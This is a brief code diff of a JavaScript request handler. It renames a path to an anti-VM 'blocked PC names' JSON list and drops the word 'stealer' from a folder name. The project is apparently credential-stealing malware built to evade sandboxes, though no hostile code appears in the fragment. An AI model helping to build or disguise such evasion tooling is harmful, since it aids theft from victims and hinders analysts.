@@ -1,6 +1,6 @@
 import fs from 'fs';
 import path from 'path';
-const blockedPath = 'src/files/scripts/aurathemes.stealer/json/antivm/blocked.pc.name.json';
+const blockedPath = 'src/files/scripts/aurathemes/json/antivm/blocked.pc.name.json';
 export default async function handler(req, res) {
   try {
     if (
